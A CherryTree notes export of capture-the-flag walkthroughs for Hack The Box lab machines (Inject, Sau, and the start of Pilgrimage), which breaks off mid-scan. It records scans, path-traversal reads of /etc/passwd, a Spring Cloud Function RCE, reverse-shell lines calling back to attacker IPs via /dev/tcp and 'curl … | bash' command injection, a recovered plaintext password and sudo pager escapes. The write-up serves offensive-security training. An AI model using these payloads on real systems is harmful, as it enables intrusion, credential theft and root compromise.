<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="HTB" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675434884" ts_lastsave="1698956952">
    <node name="Easypass" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675435533" ts_lastsave="1675435537">
      <node name="Ghidra" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675435542" ts_lastsave="1675435544">
        <rich_text>Open file in Ghidra
</rich_text>
      </node>
    </node>
    <node name="Injection" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689073807" ts_lastsave="1689158249">
      <rich_text>10.129.145.167</rich_text>
      <node name="nmap" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689073815" ts_lastsave="1689074521">
        <rich_text># Nmap 7.94 scan initiated Tue Jul 11 07:11:04 2023 as: nmap -p- -sC -sV -oA nmap/injection 10.129.145.167
Nmap scan report for 10.129.145.167
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Tue Jul 11 07:11:28 2023 -- 1 IP address (1 host up) scanned in 24.42 seconds</rich_text>
      </node>
      <node name="buster" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689074403" ts_lastsave="1689074564">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                                              

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      112l      326w     5371c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/blogs">http://10.129.145.167:8080/blogs</rich_text>
        <rich_text>
200      GET      104l      194w     5654c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/register">http://10.129.145.167:8080/register</rich_text>
        <rich_text>
200      GET       26l       48w      457c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/test.css">http://10.129.145.167:8080/css/test.css</rich_text>
        <rich_text>
200      GET       54l      107w     1857c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/upload">http://10.129.145.167:8080/upload</rich_text>
        <rich_text>
200      GET       22l       22w      262c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/under.css">http://10.129.145.167:8080/css/under.css</rich_text>
        <rich_text>
500      GET        1l        3w      106c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/error">http://10.129.145.167:8080/error</rich_text>
        <rich_text>
200      GET        7l     2006w   163873c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/webjars/bootstrap/css/bootstrap.min.css">http://10.129.145.167:8080/webjars/bootstrap/css/bootstrap.min.css</rich_text>
        <rich_text>
200      GET      166l      487w     6657c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>
200      GET      155l      278w     3093c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/blog.css">http://10.129.145.167:8080/css/blog.css</rich_text>
        <rich_text>
200      GET        7l     2006w   163873c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/webjars/bootstrap/5.1.3/css/bootstrap.min.css">http://10.129.145.167:8080/webjars/bootstrap/5.1.3/css/bootstrap.min.css</rich_text>
        <rich_text>
500      GET        1l       27w      712c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/environment">http://10.129.145.167:8080/environment</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/plain]">http://10.129.145.167:8080/plain]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/[">http://10.129.145.167:8080/[</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/]">http://10.129.145.167:8080/]</rich_text>
        <rich_text>
[############&gt;-------] - 72s    18400/30019   0s      found:14      errors:0      
[############&gt;-------] - 72s    18373/30000   253/s   </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                     400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/quote]">http://10.129.145.167:8080/quote]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/extension]">http://10.129.145.167:8080/extension]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/[0-9]">http://10.129.145.167:8080/[0-9]</rich_text>
        <rich_text>
[####################] - 2m     30019/30019   0s      found:17      errors:0      
[####################] - 2m     30000/30000   258/s   </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                                                                                                                           
</rich_text>
      </node>
      <node name="LFI" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689077445" ts_lastsave="1689077639">
        <rich_text>in burpsuite

GET /show_image?img=../../../../../../etc/passwd HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 1986
Date: Tue, 11 Jul 2023 12:03:39 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
</rich_text>
      </node>
      <node name="LFI2" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689077639" ts_lastsave="1689078228">
        <rich_text>GET /show_image?img=../ HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 4096
Date: Tue, 11 Jul 2023 12:13:33 GMT
Connection: close

java
resources
uploads
</rich_text>
      </node>
      <node name="LFI3" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689078228" ts_lastsave="1689078287">
        <rich_text>GET /show_image?img=../../../../../../../var/www/WebApp/pom.xml HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 2187
Date: Tue, 11 Jul 2023 12:23:36 GMT
Connection: close

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;project xmlns="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text>" xmlns:xsi="</rich_text>
        <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
        <rich_text>"
	xsi:schemaLocation="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text> </rich_text>
        <rich_text link="webs https://maven.apache.org/xsd/maven-4.0.0.xsd">https://maven.apache.org/xsd/maven-4.0.0.xsd</rich_text>
        <rich_text>"&gt;
	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
	&lt;parent&gt;
		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
		&lt;version&gt;2.6.5&lt;/version&gt;
		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
	&lt;/parent&gt;
	&lt;groupId&gt;com.example&lt;/groupId&gt;
	&lt;artifactId&gt;WebApp&lt;/artifactId&gt;
	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
	&lt;name&gt;WebApp&lt;/name&gt;
	&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;
	&lt;properties&gt;
		&lt;java.version&gt;11&lt;/java.version&gt;
	&lt;/properties&gt;
	&lt;dependencies&gt;
		&lt;dependency&gt;
  			&lt;groupId&gt;com.sun.activation&lt;/groupId&gt;
  			&lt;artifactId&gt;javax.activation&lt;/artifactId&gt;
  			&lt;version&gt;1.2.0&lt;/version&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
			&lt;scope&gt;runtime&lt;/scope&gt;
			&lt;optional&gt;true&lt;/optional&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
			&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
			&lt;version&gt;3.2.2&lt;/version&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
			&lt;scope&gt;test&lt;/scope&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.webjars&lt;/groupId&gt;
			&lt;artifactId&gt;bootstrap&lt;/artifactId&gt;
			&lt;version&gt;5.1.3&lt;/version&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.webjars&lt;/groupId&gt;
			&lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;
		&lt;/dependency&gt;

	&lt;/dependencies&gt;
	&lt;build&gt;
		&lt;plugins&gt;
			&lt;plugin&gt;
				&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
				&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
				&lt;version&gt;${parent.version}&lt;/version&gt;
			&lt;/plugin&gt;
		&lt;/plugins&gt;
		&lt;finalName&gt;spring-webapp&lt;/finalName&gt;
	&lt;/build&gt;

&lt;/project&gt;
</rich_text>
      </node>
      <node name="exploit" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689078287" ts_lastsave="1689080353">
        <rich_text>spring-cloud-function-web 3.2.2 exploit

</rich_text>
        <rich_text link="webs https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE">https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE</rich_text>
        <rich_text>

git clone </rich_text>
        <rich_text link="webs https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE.git">https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE.git</rich_text>
        <rich_text>

python3 spring-cloud-rce.py


nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.145.167] 41128
/bin/sh: 0: can't access tty; job control turned off
$ whoami
frank
$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
$


frank@inject:~/.m2$ cat settings.xml 
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;settings xmlns="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text>" xmlns:xsi="</rich_text>
        <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
        <rich_text>"
        xsi:schemaLocation="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text> </rich_text>
        <rich_text link="webs https://maven.apache.org/xsd/maven-4.0.0.xsd">https://maven.apache.org/xsd/maven-4.0.0.xsd</rich_text>
        <rich_text>"&gt;
  &lt;servers&gt;
    &lt;server&gt;
      &lt;id&gt;Inject&lt;/id&gt;
      &lt;username&gt;phil&lt;/username&gt;
      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
      &lt;configuration&gt;&lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;



frank@inject:~$ su phil
Password: 
phil@inject:/home/frank$ whoami
phil
phil@inject:/home/frank$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:/home/frank$


phil@inject:/home/frank$ cd
phil@inject:~$ cat user.txt 
26d42bbfbdbf8ef18ed865c4ce22dee7


run linpeas.sh


phil@inject:/opt/automation/tasks$ cat playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started

      
create a playbook

phil@inject:/opt/automation/tasks$ cat playbook_2.yml 
- hosts: localhost
  tasks: [shell: /bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/10.10.16.5/444 0&gt;&amp;1 ’]
  
  
wait for callback

      
nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.145.167] 57464
bash: cannot set terminal process group (26957): Inappropriate ioctl for device
bash: no job control in this shell
root@inject:/opt/automation/tasks# 

root@inject:/opt/automation/tasks# id
id
uid=0(root) gid=0(root) groups=0(root)

root@inject:~# pwd
pwd
/root
root@inject:~# ls
ls
playbook_1.yml
root.txt
root@inject:~# cat roo	
cat root.txt 
f844e8f584e0af0e6fa67d8261e12929
root@inject:~#</rich_text>
      </node>
    </node>
    <node name="Sau" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689158249" ts_lastsave="1690539664">
      <node name="nmap" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689158254" ts_lastsave="1689171373">
        <rich_text># Nmap 7.94 scan initiated Wed Jul 12 06:34:51 2023 as: nmap -p- -sC -sV -oA nmap/all 10.129.144.245
Nmap scan report for 10.129.144.245
Host is up (0.034s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 12 Jul 2023 10:35:51 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 12 Jul 2023 10:35:25 GMT
|     Content-Length: 27
|     href="/web"&gt;Found&lt;/a&gt;.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 12 Jul 2023 10:35:25 GMT
|_    Content-Length: 0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Wed Jul 12 06:36:49 2023 -- 1 IP address (1 host up) scanned in 117.97 seconds</rich_text>
      </node>
      <node name="web" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171373" ts_lastsave="1689171416">
        <rich_text link="webs http://10.129.144.245:55555/web">http://10.129.144.245:55555/web</rich_text>
      </node>
      <node name="buster" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171416" ts_lastsave="1689171488">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api">http://10.129.144.245:55555/api</rich_text>
        <rich_text>        

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api">http://10.129.144.245:55555/api</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l        3w       45c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/Stats">http://10.129.144.245:55555/api/Stats</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/stats">http://10.129.144.245:55555/api/stats</rich_text>
        <rich_text>
301      GET        2l        3w       47c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/VERSION">http://10.129.144.245:55555/api/VERSION</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
200      GET        1l        1w      140c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
301      GET        2l        3w       45c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/STATS">http://10.129.144.245:55555/api/STATS</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/stats">http://10.129.144.245:55555/api/stats</rich_text>
      </node>
      <node name="requests-basket" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171488" ts_lastsave="1689171545">
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
name	"request-baskets"
version	"1.2.1"
commit	"n/a"
commit_short	"n/a"
source_code	"</rich_text>
        <rich_text link="webs https://github.com/darklynx/request-baskets">https://github.com/darklynx/request-baskets</rich_text>
        <rich_text>"

</rich_text>
        <rich_text link="webs https://github.com/darklynx/request-baskets/">request-baskets</rich_text>
        <rich_text> 1.2.1  exploit
</rich_text>
      </node>
      <node name="exploit" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171545" ts_lastsave="1689171835">
        <rich_text link="webs https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3">https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://notes.sjtu.edu.cn/s/MUUhEymt7">https://notes.sjtu.edu.cn/s/MUUhEymt7</rich_text>
        <rich_text>


create burp request

proxy response = true

POST /api/baskets/testHTTP/1.1
Host: 10.129.144.245:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 125

{"forward_url": "</rich_text>
        <rich_text link="webs http://127.0.0.1:80/login">http://127.0.0.1:80/</rich_text>
        <rich_text>","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}


see Maltrail v0.53 exploit


</rich_text>
        <rich_text link="webs https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</rich_text>
        <rich_text>


create another burp request

proxy response = true
login

POST /api/baskets/test2 HTTP/1.1
Host: 10.129.144.245:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 125

{"forward_url": "</rich_text>
        <rich_text link="webs http://127.0.0.1:80/login">http://127.0.0.1:80/login</rich_text>
        <rich_text>","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}



serve reverse shell.sh
python3 -m http.server 80


curl 'http://10.129.144.245:55555/test2' \   
  --data 'username=;`curl http://10.10.14.42/shell.sh | bash`'
  
  
  
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.144.245] 46882
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$
puma@sau:~$ cat user.txt 
cat user.txt
c8958b3fceab6081a92de715b1440bd3



puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
    
    
    
sudo /usr/bin/systemctl status trail.service
!sh

cat root.txt</rich_text>
      </node>
    </node>
    <node name="Pilgrimage" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689322762" ts_lastsave="1689322925">
      <rich_text>10.129.142.239</rich_text>
      <node name="nmap" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689322767" ts_lastsave="1689323176">
        <rich_text>sudo nmap -p- -sC -sV 10.129.142.239 -oA nmap/all
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-07-14 04:22 EDT
Nmap scan report for 10.129.142.239
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to </rich_text>
